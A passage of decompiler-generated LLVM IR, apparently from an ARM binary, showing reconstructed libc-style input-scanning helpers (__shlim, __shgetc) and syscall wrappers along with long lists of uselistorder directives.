  store i32 %v3_11a60, i32* @r2, align 4
  %v2_11a64 = icmp eq i32 %v3_11a60, 0
  br i1 %v2_11a64, label %.thread57, label %bb206

bb206:                                            ; preds = %dec_label_pc_11a60
  %v2_11a68 = add i32 %v0_11a60, 4
  %v3_11a68 = inttoptr i32 %v2_11a68 to i32*
  %v4_11a68 = load i32, i32* %v3_11a68, align 4
  %v2_11a6c = add i32 %v4_11a68, -1
  store i32 %v2_11a6c, i32* %v3_11a68, align 4
  br label %.thread57

.thread57:                                        ; preds = %dec_label_pc_11a60, %bb206
  %v0_11a74 = load i32, i32* @r6, align 4
  %v2_11a74 = icmp eq i32 %v0_11a74, 0
  br i1 %v2_11a74, label %dec_label_pc_11ab8, label %dec_label_pc_11a7c

dec_label_pc_11a7c:                               ; preds = %.thread57
  %v0_11a7c = load i32, i32* @r2, align 4
  %v2_11a7c = icmp eq i32 %v0_11a7c, 0
  br i1 %v2_11a7c, label %dec_label_pc_11ae4, label %dec_label_pc_11a84

dec_label_pc_11a84:                               ; preds = %dec_label_pc_11a7c
  %v0_11a84 = load i32, i32* @sl, align 4
  %v1_11a84 = add i32 %v0_11a84, 4
  %v2_11a84 = inttoptr i32 %v1_11a84 to i32*
  %v3_11a84 = load i32, i32* %v2_11a84, align 4
  store i32 0, i32* @r2, align 4
  %v1_11a90 = add i32 %v3_11a84, -1
  store i32 %v1_11a90, i32* @r3, align 4
  store i32 0, i32* %stack_var_0, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v1_11a90, i32* %v2_11a84, align 4
  %v1_1161c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11614

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11a2c
  store i32 %v0_11a2c, i32* %r0.global-to-local, align 4
  %v1_11ab0 = call i32 @__shgetc(i32 %v0_11a2c)
  store i32 %v1_11ab0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11a44

dec_label_pc_11ab8:                               ; preds = %.thread57
  %v0_11ab8 = load i32, i32* @sl, align 4
  store i32 %v0_11ab8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v8_11ac4 = call i32 @__shlim(i32 %v0_11ab8, i32 %tmp, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 0, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  br label %dec_label_pc_11614

dec_label_pc_11ae4:                               ; preds = %dec_label_pc_11a7c
  store i32 0, i32* @r3, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  br label %dec_label_pc_11614

; uselistorder directives
  uselistorder i32 %v1_11ab0, { 1, 0 }
  uselistorder i32 %v6_11a48, { 1, 0 }
  uselistorder i32 %v3_11a2c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11a20, { 1, 2, 0 }
  uselistorder i32 %v2_119f4, { 1, 0 }
  uselistorder i32 %v1_119a0, { 1, 0 }
  uselistorder i32 %v1_11994, { 1, 0 }
  uselistorder i32 %v5_11990, { 1, 0 }
  uselistorder i32 %v2_1198c, { 1, 2, 0 }
  uselistorder i32 %v0_1198c, { 1, 0 }
  uselistorder i32 %v0_11994, { 1, 0 }
  uselistorder i32 %v3_1196c, { 1, 0, 2, 3 }
  uselistorder i1 %v9_1195c, { 1, 0 }
  uselistorder i32 %v5_11928, { 1, 0, 2 }
  uselistorder i32 %v6_118f8, { 1, 0 }
  uselistorder i1 %v9_118cc, { 1, 0 }
  uselistorder i1 %v7_118c0, { 1, 0 }
  uselistorder i32 %v0_118ec, { 2, 3, 0, 1, 5, 4, 6, 7 }
  uselistorder i32 %v0_11928, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v0_11924, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v1_11884, { 1, 0 }
  uselistorder i32 %v3_11868, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1184c, { 2, 0, 1 }
  uselistorder i64 %v4_11844, { 1, 0 }
  uselistorder i32 %v5_1180c, { 1, 0 }
  uselistorder i32 %v0_11804, { 1, 0 }
  uselistorder i32 %v2_117c8, { 2, 1, 0 }
  uselistorder i32 %v2_117c0, { 1, 0 }
  uselistorder i32 %v3_117bc, { 1, 0 }
  uselistorder i32 %v1_1176c, { 1, 0 }
  uselistorder i32 %v3_11788, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-60.2.off0, { 0, 2, 1 }
  uselistorder i32 %v2_11760, { 1, 0 }
  uselistorder i32 %v3_119fc, { 1, 0, 2, 3 }
  uselistorder i1 %v9_11724, { 1, 2, 0 }
  uselistorder i32 %v1_11724, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-44.2, { 3, 2, 0, 5, 4, 1 }
  uselistorder i32 %v1_116c4, { 0, 2, 1 }
  uselistorder i32 %v0_116cc, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1168c, { 1, 0 }
  uselistorder i32 %v3_11658, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1163c, { 1, 0 }
  uselistorder i32 %v0_115e8, { 1, 0 }
  uselistorder i32 %v1_11580, { 1, 0 }
  uselistorder i32 %v3_115b0, { 1, 0, 2, 3 }
  uselistorder i1 %v2_115a4, { 1, 0 }
  uselistorder i32 %v0_118b4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11584, { 1, 0 }
  uselistorder i32 %v0_11598, { 1, 0 }
  uselistorder i32 %v1_1152c, { 1, 0 }
  uselistorder i32 %v3_11560, { 1, 0, 2, 3 }
  uselistorder i1 %v3_11554, { 1, 0 }
  uselistorder i32 %v4_11510, { 1, 0 }
  uselistorder i32 %v0_1150c, { 1, 2, 0 }
  uselistorder i32 %v3_114dc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_114d4, { 1, 0 }
  uselistorder i32 %v1_114cc, { 1, 0 }
  uselistorder i32 %v3_114b0, { 1, 0, 2, 3 }
  uselistorder i1 %v2_114a4, { 1, 0 }
  uselistorder i32 %v0_11648, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1145c, { 18, 17, 16, 7, 13, 12, 0, 1, 2, 8, 9, 10, 15, 5, 3, 6, 14, 11, 19, 4 }
  uselistorder i32 %v4_11558107, { 1, 0 }
  uselistorder i32 %v0_11444, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1142c, { 1, 2, 0 }
  uselistorder i32 %v0_11420143, { 1, 0 }
  uselistorder i32 %v3_113d4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_113a0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_11384, { 2, 3, 0, 1 }
  uselistorder i32* %v2_11384, { 1, 0 }
  uselistorder i32 %v2_11394, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11374, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 5, 6, 7, 8, 9, 10, 4, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %tmp, { 6, 5, 1, 4, 2, 3, 8, 9, 7, 0, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 20, 21, 22, 17, 18, 19, 23, 24, 25, 26, 27, 39, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 23, 19, 20, 21, 22, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 10, 7, 5, 6, 8, 9, 13, 11, 12, 17, 15, 14, 16, 19, 18, 23, 20, 21, 22, 25, 24, 27, 26, 32, 28, 29, 30, 31, 39, 36, 33, 34, 35, 37, 38, 41, 40, 46, 42, 43, 44, 45, 50, 47, 48, 49, 54, 51, 52, 53, 56, 55, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 8, 9, 2, 3, 4, 10, 5, 11, 6, 7, 12, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__shlim, { 2, 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_19dc5.617 to i32), i32 1), { 1, 5, 4, 3, 2, 0, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_19dc6.615 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__shgetc, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 3, 7, 8, 0, 9, 4, 5, 1, 2, 6 }
  uselistorder label %.thread57, { 1, 0 }
  uselistorder label %dec_label_pc_11a44, { 1, 0 }
  uselistorder label %dec_label_pc_11984, { 1, 0 }
  uselistorder label %dec_label_pc_118ec, { 0, 2, 1 }
  uselistorder label %dec_label_pc_118e0, { 0, 2, 1 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %dec_label_pc_11864, { 1, 0 }
  uselistorder label %dec_label_pc_117fc, { 1, 0 }
  uselistorder label %dec_label_pc_117f0, { 1, 0 }
  uselistorder label %dec_label_pc_1177c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_11770, { 1, 0 }
  uselistorder label %dec_label_pc_11730, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_1170c, { 5, 3, 4, 1, 2, 6, 0 }
  uselistorder label %bb198, { 1, 0 }
  uselistorder label %dec_label_pc_116a0, { 2, 1, 0 }
  uselistorder label %bb196, { 1, 0 }
  uselistorder label %dec_label_pc_11670, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %bb193, { 1, 0 }
  uselistorder label %dec_label_pc_1159c, { 1, 0 }
  uselistorder label %dec_label_pc_11584, { 1, 0 }
  uselistorder label %dec_label_pc_11560, { 1, 0 }
  uselistorder label %dec_label_pc_11548, { 1, 0 }
  uselistorder label %dec_label_pc_11530, { 1, 0 }
  uselistorder label %dec_label_pc_114f4, { 1, 0 }
  uselistorder label %dec_label_pc_114d4, { 1, 0 }
  uselistorder label %dec_label_pc_114b0, { 1, 0 }
  uselistorder label %dec_label_pc_114a0, { 1, 0 }
  uselistorder label %dec_label_pc_11490, { 1, 0 }
  uselistorder label %dec_label_pc_11434, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %dec_label_pc_11414, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %dec_label_pc_113fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_113ec, { 1, 0 }
  uselistorder label %dec_label_pc_11384, { 1, 0 }
  uselistorder label %dec_label_pc_11384.backedge, { 3, 0, 2, 1 }
}

define i32 @function_11b0c() local_unnamed_addr {
dec_label_pc_11b0c:
  %v0_11b0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11b0c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_11b0c
  %v1_11b0c = load i32, i32* @sb, align 4
  %v20_11b0c = add i32 %v1_11b0c, 28
  %v21_11b0c = inttoptr i32 %v20_11b0c to i32*
  %v22_11b0c = load i32, i32* %v21_11b0c, align 4
  call void @__pseudo_branch(i32 %v22_11b0c)
  %v0_11b10.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11b10.pr, label %.thread, label %bb1

bb1:                                              ; preds = %bb
  %v1_11b10 = load i32, i32* @sb, align 4
  %v2_11b10 = add i32 %v1_11b10, 4
  %v3_11b10 = inttoptr i32 %v2_11b10 to i32*
  %v4_11b10 = load i32, i32* %v3_11b10, align 4
  %v23_11b10 = add i32 %v1_11b10, 32
  %v24_11b10 = inttoptr i32 %v23_11b10 to i32*
  %v25_11b10 = load i32, i32* %v24_11b10, align 4
  call void @__pseudo_branch(i32 %v25_11b10)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11b0c, %bb, %bb1
  %.0 = phi i32 [ undef, %bb ], [ %v4_11b10, %bb1 ], [ undef, %dec_label_pc_11b0c ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %.thread, { 2, 1, 0 }
}

define i32 @__shlim(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11b14 = load i32, i32* @r4, align 4
  store i32 %v3_11b14, i32* %stack_var_-8, align 4
  %v1_11b18 = add i32 %arg1, 8
  %v2_11b18 = inttoptr i32 %v1_11b18 to i32*
  %v3_11b18 = load i32, i32* %v2_11b18, align 4
  store i32 %v3_11b18, i32* @ip, align 4
  %v1_11b1c = add i32 %arg1, 4
  %v2_11b1c = inttoptr i32 %v1_11b1c to i32*
  %v3_11b1c = load i32, i32* %v2_11b1c, align 4
  store i32 %v3_11b1c, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v2_11b28 = sub i32 %v3_11b18, %v3_11b1c
  store i32 %v2_11b28, i32* %r3.global-to-local, align 4
  %v2_11b2c = or i32 %arg3, %arg2
  %v4_11b2c = icmp eq i32 %v2_11b2c, 0
  %v3_11b30 = ashr i32 %v2_11b28, 31
  store i32 %v3_11b30, i32* %r4.global-to-local, align 4
  %v2_11b34 = add i32 %arg1, 112
  %v3_11b34 = inttoptr i32 %v2_11b34 to i32*
  store i32 %arg2, i32* %v3_11b34, align 4
  %v0_11b38 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b38 = add i32 %arg1, 116
  %v3_11b38 = inttoptr i32 %v2_11b38 to i32*
  store i32 %v0_11b38, i32* %v3_11b38, align 4
  %v0_11b3c = load i32, i32* %r3.global-to-local, align 4
  %v2_11b3c = add i32 %arg1, 120
  %v3_11b3c = inttoptr i32 %v2_11b3c to i32*
  store i32 %v0_11b3c, i32* %v3_11b3c, align 4
  %v0_11b40 = load i32, i32* %r4.global-to-local, align 4
  %v2_11b40 = add i32 %arg1, 124
  %v3_11b40 = inttoptr i32 %v2_11b40 to i32*
  store i32 %v0_11b40, i32* %v3_11b40, align 4
  br i1 %v4_11b2c, label %dec_label_pc_11b60, label %dec_label_pc_11b48

dec_label_pc_11b48:                               ; preds = %entry
  %v0_11b48 = load i32, i32* %r4.global-to-local, align 4
  %v1_11b48 = load i32, i32* %r2.global-to-local, align 4
  %v7_11b4c = icmp sgt i32 %v0_11b48, %v1_11b48
  br i1 %v7_11b4c, label %dec_label_pc_11b48.dec_label_pc_11b50_crit_edge, label %dec_label_pc_11b5c

dec_label_pc_11b48.dec_label_pc_11b50_crit_edge:  ; preds = %dec_label_pc_11b48
  %v1_11b50.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11b50

dec_label_pc_11b50:                               ; preds = %dec_label_pc_11b6c, %dec_label_pc_11b48.dec_label_pc_11b50_crit_edge
  %v1_11b50 = phi i32 [ %v1_11b50.pre, %dec_label_pc_11b48.dec_label_pc_11b50_crit_edge ], [ %v1_11b6c, %dec_label_pc_11b6c ]
  %v0_11b50 = load i32, i32* %lr.global-to-local, align 4
  %v2_11b50 = add i32 %v0_11b50, %v1_11b50
  store i32 %v2_11b50, i32* %r3.global-to-local, align 4
  %v2_11b54 = add i32 %arg1, 104
  %v3_11b54 = inttoptr i32 %v2_11b54 to i32*
  store i32 %v2_11b50, i32* %v3_11b54, align 4
  br label %dec_label_pc_11b64

dec_label_pc_11b5c:                               ; preds = %dec_label_pc_11b48
  %v9_11b48 = icmp eq i32 %v0_11b48, %v1_11b48
  br i1 %v9_11b48, label %dec_label_pc_11b6c, label %dec_label_pc_11b60

dec_label_pc_11b60:                               ; preds = %dec_label_pc_11b6c, %dec_label_pc_11b5c, %entry
  %v0_11b60 = load i32, i32* @ip, align 4
  %v2_11b60 = add i32 %arg1, 104
  %v3_11b60 = inttoptr i32 %v2_11b60 to i32*
  store i32 %v0_11b60, i32* %v3_11b60, align 4
  br label %dec_label_pc_11b64

dec_label_pc_11b64:                               ; preds = %dec_label_pc_11b50, %dec_label_pc_11b60
  %v2_11b64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11b64, i32* %r4.global-to-local, align 4
  ret i32 %arg1

dec_label_pc_11b6c:                               ; preds = %dec_label_pc_11b5c
  %v0_11b6c = load i32, i32* %r3.global-to-local, align 4
  %v1_11b6c = load i32, i32* %r1.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_11b6c, %v1_11b6c
  br i1 %tmp, label %dec_label_pc_11b50, label %dec_label_pc_11b60

; uselistorder directives
  uselistorder i32 %v1_11b48, { 1, 0 }
  uselistorder i32 %v0_11b48, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 0, 1, 2, 8, 5, 7, 6, 4, 3 }
  uselistorder label %dec_label_pc_11b64, { 1, 0 }
}

define i32 @__shgetc(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_11b78 = load i32, i32* @r4, align 4
  store i32 %v3_11b78, i32* %stack_var_-28, align 4
  %v1_11b7c = add i32 %arg1, 112
  %v1_11b80 = inttoptr i32 %v1_11b7c to i32*
  %v2_11b80 = load i32, i32* %v1_11b80, align 4
  %v3_11b80 = add i32 %arg1, 116
  %v4_11b80 = inttoptr i32 %v3_11b80 to i32*
  %v5_11b80 = load i32, i32* %v4_11b80, align 4
  store i32 %v5_11b80, i32* @r2, align 4
  %v2_11b84 = or i32 %v5_11b80, %v2_11b80
  %v4_11b84 = icmp eq i32 %v2_11b84, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v4_11b84, label %dec_label_pc_11bc8, label %dec_label_pc_11b94

dec_label_pc_11b94:                               ; preds = %entry
  %v1_11b94 = add i32 %arg1, 124
  %v2_11b94 = inttoptr i32 %v1_11b94 to i32*
  %v3_11b94 = load i32, i32* %v2_11b94, align 4
  %v5_11b9c = icmp slt i32 %v3_11b94, %v5_11b80
  br i1 %v5_11b9c, label %dec_label_pc_11bc8, label %dec_label_pc_11ba0

dec_label_pc_11ba0:                               ; preds = %dec_label_pc_11b94
  %v9_11b98 = icmp eq i32 %v3_11b94, %v5_11b80
  br i1 %v9_11b98, label %dec_label_pc_11bbc, label %dec_label_pc_11ba4

dec_label_pc_11ba4:                               ; preds = %dec_label_pc_11bbc, %dec_label_pc_11bc8, %dec_label_pc_11ba0
  %v1_11ba8 = phi i32 [ %arg1, %dec_label_pc_11bbc ], [ %arg1, %dec_label_pc_11ba0 ], [ %v1_11ba8.pre, %dec_label_pc_11bc8 ]
  %v2_11ba8 = add i32 %v1_11ba8, 104
  %v3_11ba8 = inttoptr i32 %v2_11ba8 to i32*
  store i32 0, i32* %v3_11ba8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11bb0

dec_label_pc_11bb0:                               ; preds = %bb, %dec_label_pc_11c20, %dec_label_pc_11ba4
  %v1_11bb8 = phi i32 [ %v1_11bb8.pre, %bb ], [ %v4_11c20, %dec_label_pc_11c20 ], [ -1, %dec_label_pc_11ba4 ]
  %v2_11bb4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_11bb4, i32* @r4, align 4
  ret i32 %v1_11bb8

dec_label_pc_11bbc:                               ; preds = %dec_label_pc_11ba0
  %v1_11bbc = add i32 %arg1, 120
  %v2_11bbc = inttoptr i32 %v1_11bbc to i32*
  %v3_11bbc = load i32, i32* %v2_11bbc, align 4
  %v3_11bc0 = icmp ult i32 %v3_11bbc, %v2_11b80
  br i1 %v3_11bc0, label %dec_label_pc_11bc8, label %dec_label_pc_11ba4

dec_label_pc_11bc8:                               ; preds = %dec_label_pc_11bbc, %dec_label_pc_11b94, %entry
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_11bcc = call i32 @__uflow(i32 %arg1)
  store i32 %v1_11bcc, i32* %r0.global-to-local, align 4
  %v1_11bd0 = icmp slt i32 %v1_11bcc, 0
  %v1_11ba8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v1_11bd0, label %dec_label_pc_11ba4, label %dec_label_pc_11bd8

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11bc8
  %v1_11bd8 = add i32 %v1_11ba8.pre, 112
  %v1_11bdc = inttoptr i32 %v1_11bd8 to i32*
  %v2_11bdc = load i32, i32* %v1_11bdc, align 4
  %v3_11bdc = add i32 %v1_11ba8.pre, 116
  %v4_11bdc = inttoptr i32 %v3_11bdc to i32*
  %v5_11bdc = load i32, i32* %v4_11bdc, align 4
  store i32 %v5_11bdc, i32* @r2, align 4
  %v2_11be0 = or i32 %v5_11bdc, %v2_11bdc
  %v4_11be0 = icmp eq i32 %v2_11be0, 0
  br i1 %v4_11be0, label %dec_label_pc_11be8, label %dec_label_pc_11c30

dec_label_pc_11be8:                               ; preds = %dec_label_pc_11bd8
  %v1_11be8 = add i32 %v1_11ba8.pre, 4
  %v2_11be8 = inttoptr i32 %v1_11be8 to i32*
  %v3_11be8 = load i32, i32* %v2_11be8, align 4
  store i32 %v3_11be8, i32* %lr.global-to-local, align 4
  %v1_11bec = add i32 %v1_11ba8.pre, 8
  %v2_11bec = inttoptr i32 %v1_11bec to i32*
  %v3_11bec = load i32, i32* %v2_11bec, align 4
  store i32 %v3_11bec, i32* @ip, align 4
  br label %dec_label_pc_11bf0

dec_label_pc_11bf0:                               ; preds = %dec_label_pc_11c78, %dec_label_pc_11c74, %dec_label_pc_11be8
  %v0_11bf0 = phi i32 [ %v3_11c3c, %dec_label_pc_11c74 ], [ %v3_11c3c, %dec_label_pc_11c78 ], [ %v3_11bec, %dec_label_pc_11be8 ]
  %v2_11bf0 = add i32 %v1_11ba8.pre, 104
  %v3_11bf0 = inttoptr i32 %v2_11bf0 to i32*
  store i32 %v0_11bf0, i32* %v3_11bf0, align 4
  br label %dec_label_pc_11bf4

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11c60, %dec_label_pc_11bf0
  %v0_11bf4 = load i32, i32* @ip, align 4
  %v2_11bf4 = icmp eq i32 %v0_11bf4, 0
  br i1 %v2_11bf4, label %dec_label_pc_11c20, label %dec_label_pc_11bfc

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11bf4
  %v1_11bfc = add i32 %v0_11bf4, 1
  %v0_11c00 = load i32, i32* %r5.global-to-local, align 4
  %v1_11c00 = add i32 %v0_11c00, 120
  %v1_11c04 = inttoptr i32 %v1_11c00 to i32*
  %v2_11c04 = load i32, i32* %v1_11c04, align 4
  %v3_11c04 = add i32 %v0_11c00, 124
  %v4_11c04 = inttoptr i32 %v3_11c04 to i32*
  %v5_11c04 = load i32, i32* %v4_11c04, align 4
  %v0_11c08 = load i32, i32* %lr.global-to-local, align 4
  %v2_11c08 = sub i32 %v1_11bfc, %v0_11c08
  %v3_11c0c = ashr i32 %v2_11c08, 31
  %v2_11c10 = add i32 %v2_11c08, %v2_11c04
  %v3_11c10 = icmp ult i32 %v2_11c10, %v2_11c04
  %v3_11c14 = add i32 %v3_11c0c, %v5_11c04
  %v4_11c14 = zext i1 %v3_11c10 to i32
  %v5_11c14 = add i32 %v4_11c14, %v3_11c14
  store i32 %v5_11c14, i32* @r2, align 4
  store i32 %v2_11c10, i32* %v1_11c04, align 4
  %v0_11c1c = load i32, i32* @r2, align 4
  %v1_11c1c = load i32, i32* %r5.global-to-local, align 4
  %v2_11c1c = add i32 %v1_11c1c, 124
  %v3_11c1c = inttoptr i32 %v2_11c1c to i32*
  store i32 %v0_11c1c, i32* %v3_11c1c, align 4
  br label %dec_label_pc_11c20

dec_label_pc_11c20:                               ; preds = %dec_label_pc_11bf4, %dec_label_pc_11bfc
  %v0_11c20 = load i32, i32* %lr.global-to-local, align 4
  %v1_11c20 = add i32 %v0_11c20, -1
  %v2_11c20 = inttoptr i32 %v1_11c20 to i8*
  %v3_11c20 = load i8, i8* %v2_11c20, align 1
  %v4_11c20 = zext i8 %v3_11c20 to i32
  %v0_11c24 = load i32, i32* %r0.global-to-local, align 4
  %v9_11c24 = icmp eq i32 %v0_11c24, %v4_11c20
  br i1 %v9_11c24, label %dec_label_pc_11bb0, label %bb

bb:                                               ; preds = %dec_label_pc_11c20
  %v2_11c28 = trunc i32 %v0_11c24 to i8
  store i8 %v2_11c28, i8* %v2_11c20, align 1
  %v1_11bb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11bb0

dec_label_pc_11c30:                               ; preds = %dec_label_pc_11bd8
  %v1_11c30 = add i32 %v1_11ba8.pre, 120
  %v1_11c34 = inttoptr i32 %v1_11c30 to i32*
  %v2_11c34 = load i32, i32* %v1_11c34, align 4
  %v3_11c34 = add i32 %v1_11ba8.pre, 124
  %v4_11c34 = inttoptr i32 %v3_11c34 to i32*
  %v5_11c34 = load i32, i32* %v4_11c34, align 4
  %v1_11c38 = add i32 %v1_11ba8.pre, 4
  %v2_11c38 = inttoptr i32 %v1_11c38 to i32*
  %v3_11c38 = load i32, i32* %v2_11c38, align 4
  store i32 %v3_11c38, i32* %lr.global-to-local, align 4
  %v1_11c3c = add i32 %v1_11ba8.pre, 8
  %v2_11c3c = inttoptr i32 %v1_11c3c to i32*
  %v3_11c3c = load i32, i32* %v2_11c3c, align 4
  store i32 %v3_11c3c, i32* @ip, align 4
  %v1_11c40 = sub i32 -1, %v2_11c34
  %v2_11c44 = add i32 %v2_11bdc, %v1_11c40
  %v3_11c44 = icmp ult i32 %v2_11c44, %v1_11c40
  %v1_11c48 = sub i32 -1, %v5_11c34
  %v2_11c4c = sub i32 %v3_11c3c, %v3_11c38
  %v3_11c50 = add i32 %v5_11bdc, %v1_11c48
  %v4_11c50 = zext i1 %v3_11c44 to i32
  %v5_11c50 = add i32 %v3_11c50, %v4_11c50
  %v3_11c54 = ashr i32 %v2_11c4c, 31
  %v7_11c5c = icmp sgt i32 %v3_11c54, %v5_11c50
  br i1 %v7_11c5c, label %dec_label_pc_11c60, label %dec_label_pc_11c74

dec_label_pc_11c60:                               ; preds = %dec_label_pc_11c78, %dec_label_pc_11c30
  %v2_11c60 = sub i32 %v2_11bdc, %v2_11c34
  store i32 %v2_11c60, i32* @r2, align 4
  %v1_11c64 = add i32 %v2_11c60, -1
  %v2_11c68 = add i32 %v1_11c64, %v3_11c38
  %v2_11c6c = add i32 %v1_11ba8.pre, 104
  %v3_11c6c = inttoptr i32 %v2_11c6c to i32*
  store i32 %v2_11c68, i32* %v3_11c6c, align 4
  br label %dec_label_pc_11bf4

dec_label_pc_11c74:                               ; preds = %dec_label_pc_11c30
  %v9_11c58 = icmp eq i32 %v3_11c54, %v5_11c50
  br i1 %v9_11c58, label %dec_label_pc_11c78, label %dec_label_pc_11bf0

dec_label_pc_11c78:                               ; preds = %dec_label_pc_11c74
  %tmp = icmp ugt i32 %v2_11c4c, %v2_11c44
  br i1 %tmp, label %dec_label_pc_11c60, label %dec_label_pc_11bf0

; uselistorder directives
  uselistorder i32 %v3_11c54, { 1, 0 }
  uselistorder i32 %v3_11c3c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_11c34, { 1, 0 }
  uselistorder i32 %v4_11c20, { 1, 0 }
  uselistorder i32 %v2_11c04, { 1, 0 }
  uselistorder i32 %v2_11bdc, { 2, 0, 1 }
  uselistorder i32 %v1_11ba8.pre, { 9, 7, 8, 4, 3, 10, 5, 6, 2, 1, 0 }
  uselistorder i32 %v3_11b94, { 1, 0 }
  uselistorder i32 %v5_11b80, { 1, 2, 0, 3 }
  uselistorder i32 %v2_11b80, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 1, 2, 0 }
  uselistorder i32 (i32)* @__uflow, { 1, 0 }
  uselistorder i32 124, { 0, 2, 1, 3, 4 }
  uselistorder i32 %arg1, { 3, 2, 5, 0, 1, 4, 8, 7, 6, 9 }
  uselistorder label %dec_label_pc_11c20, { 1, 0 }
  uselistorder label %dec_label_pc_11ba4, { 1, 0, 2 }
}

define i32 @__syscall() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_11c84 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_11c84, i32* @ip, align 4
  %v0_11c90 = load i32, i32* @r1, align 4
  %v0_11c98 = load i32, i32* @r3, align 4
  store i32 %v0_11c98, i32* @r2, align 4
  ret i32 %v0_11c90
}

define i32 @__syscall_ret() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_11cb4 = load i32, i32* @r0, align 4
  %v2_11cb4 = icmp ugt i32 %v0_11cb4, -4097
  %v7_11cb4 = icmp eq i32 %v0_11cb4, -4096
  %v3_11cb8 = load i32, i32* @r4, align 4
  store i32 %v3_11cb8, i32* %stack_var_-8, align 4
